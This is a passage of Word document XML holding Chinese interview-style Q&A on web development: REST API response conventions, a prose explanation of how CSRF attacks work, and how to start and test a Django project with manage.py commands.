      <w:bookmarkEnd w:id="441"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一般来说，服务器返回的错误信息，以键值对的形式返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F0ECEF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="442" w:name="8276-1535454054846"/>
      <w:bookmarkEnd w:id="442"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BE87EF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="443" w:name="6376-1535454054846"/>
      <w:bookmarkEnd w:id="443"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>error: 'Invalid API KEY'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D71A002" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="444" w:name="6170-1535454054846"/>
      <w:bookmarkEnd w:id="444"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1451CE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="445" w:name="6773-1535454054846"/>
      <w:bookmarkEnd w:id="445"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15932707" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="446" w:name="5777-1535454054846"/>
      <w:bookmarkEnd w:id="446"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>八、响应结果：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494CED31" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="447" w:name="6323-1535454054846"/>
      <w:bookmarkEnd w:id="447"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>针对不同结果，服务器向客户端返回的结果应符合以下规范。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27344CBD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="448" w:name="2670-1535454054846"/>
      <w:bookmarkEnd w:id="448"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#返回商品列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C70C3A2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="449" w:name="8523-1535454054846"/>
      <w:bookmarkEnd w:id="449"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET </w:t>
      </w:r>
      <w:hyperlink r:id="rId221" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2D0DD094" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="450" w:name="6455-1535454054846"/>
      <w:bookmarkEnd w:id="450"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#返回单个商品</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0607967C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="451" w:name="4728-1535454054846"/>
      <w:bookmarkEnd w:id="451"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET </w:t>
      </w:r>
      <w:hyperlink r:id="rId222" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods/cup</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> #返回新生成的商品</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C24C8EB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="452" w:name="1437-1535454054846"/>
      <w:bookmarkEnd w:id="452"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>POST </w:t>
      </w:r>
      <w:hyperlink r:id="rId223" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A3CD036" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="453" w:name="1019-1535454054846"/>
      <w:bookmarkEnd w:id="453"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#返回一个空文档</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0C96BC" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="454" w:name="7939-1535454054846"/>
      <w:bookmarkEnd w:id="454"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DELETE </w:t>
      </w:r>
      <w:hyperlink r:id="rId224" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>http://www.example.com/goods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FFF9272" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="455" w:name="6090-1535454247073"/>
      <w:bookmarkEnd w:id="455"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>九、使用链接关联相关的资源：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA20BB0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="456" w:name="3240-1535454054846"/>
      <w:bookmarkEnd w:id="456"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在返回响应结果时提供链接其他 API 的方法，使客户端很方便的获取相关联的信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A7248D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="457" w:name="8841-1535454249950"/>
      <w:bookmarkEnd w:id="457"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>十、其他：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7831DEE1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="458" w:name="7838-1535454054846"/>
      <w:bookmarkEnd w:id="458"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>服务器返回的数据格式，应该尽量使用 JSON，避免使用 XML。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C405DA4" w14:textId="11F7990E"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459" w:name="1052-1535453910672"/>
      <w:bookmarkStart w:id="460" w:name="4837-1535454330733"/>
      <w:bookmarkEnd w:id="459"/>
      <w:bookmarkEnd w:id="460"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>013</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什么</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> csrf </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>攻击原理？如何解决？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5538D1" w14:textId="1D52CC24" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="461" w:name="8399-1535454345530"/>
      <w:bookmarkEnd w:id="461"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A1C3F48" wp14:editId="561922A4">
            <wp:extent cx="5305425" cy="237172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05425" cy="2371725"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C717468" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="462" w:name="7227-1535453910711"/>
      <w:bookmarkEnd w:id="462"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>简单来说就是: 你访问了信任网站 A，然后 A 会用保存你的个人信息并返回给你的浏览器一个cookie，然后呢，在 cookie 的过期时间之内，你去访问了恶意网站 B，它给你返回一些恶意请求代码， 要求你去访问网站 A，而你的浏览器在收到这个恶意请求之后，在你不知情的情况下，会带上保存在本地浏览器的 cookie 信息去访问网站 A，然后网站 A 误以为是用户本身的操作，导致来自恶意网站 C 的攻击代码会被执：发邮件，发消息，修改你的密码，购物，转账，偷窥你的个人信息，导致私人信息泄漏和账户财产安全收到威胁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178B8264" w14:textId="3084EF45"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463" w:name="5960-1535453910772"/>
      <w:bookmarkStart w:id="464" w:name="2311-1535453910806"/>
      <w:bookmarkEnd w:id="463"/>
      <w:bookmarkEnd w:id="464"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>014</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启动</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>服务的方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E15EA2D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="465" w:name="2420-1535453910839"/>
      <w:bookmarkEnd w:id="465"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>runserver 方法是调试 Django 时经常用到的运行方式，它使用  Django  自带的 WSGI Server  运行，主要在测试和开发中使用，并且 runserver 开启的方式也是单进程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C5B4DD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="466" w:name="6071-1539938876204"/>
      <w:bookmarkEnd w:id="466"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py runserver ip:端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B84713" w14:textId="3811FC55"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467" w:name="5374-1535454398148"/>
      <w:bookmarkStart w:id="468" w:name="4014-1535454399338"/>
      <w:bookmarkEnd w:id="467"/>
      <w:bookmarkEnd w:id="468"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>015</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怎样测试</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">django </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>框架中的代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388B4DA3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="469" w:name="3980-1535454402532"/>
      <w:bookmarkEnd w:id="469"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在单元测试方面，Django 继承 python 的 unittest.TestCase 实现了自己的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532E46B9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="470" w:name="3720-1535454409098"/>
      <w:bookmarkEnd w:id="470"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django.test.TestCase，编写测试用例通常从这里开始。测试代码通常位于 app 的  tests.py  文件中(也可以在 models.py 中编写，一般不建议）。在 Django 生成的 depotapp 中，已经包含了这个文件， 并且其中包含了一个测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315C0AB7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="471" w:name="6577-1535454409098"/>
      <w:bookmarkEnd w:id="471"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用例的样例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3313CA59" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="472" w:name="2211-1535454423337"/>
      <w:bookmarkEnd w:id="472"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py test：执行所有的测试用例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19469732" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="473" w:name="1986-1535454429755"/>
      <w:bookmarkEnd w:id="473"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py test app_name， 执行该 app 的所有测试用例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44230AFE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="474" w:name="4528-1535454423740"/>
      <w:bookmarkEnd w:id="474"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py test app_name.case_name: 执行指定的测试用例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F698419" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="475" w:name="5554-1535453910887"/>
      <w:bookmarkEnd w:id="475"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一些测试工具：unittest 或者 pytest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFD740B" w14:textId="332F8257"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476" w:name="4826-1535454476309"/>
      <w:bookmarkStart w:id="477" w:name="1199-1535454470696"/>
      <w:bookmarkEnd w:id="476"/>
      <w:bookmarkEnd w:id="477"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>016</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有过部署经验？用的什么技术？可以满足多少压力</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F59B657" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="478" w:name="9946-1535454486532"/>
      <w:bookmarkEnd w:id="478"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
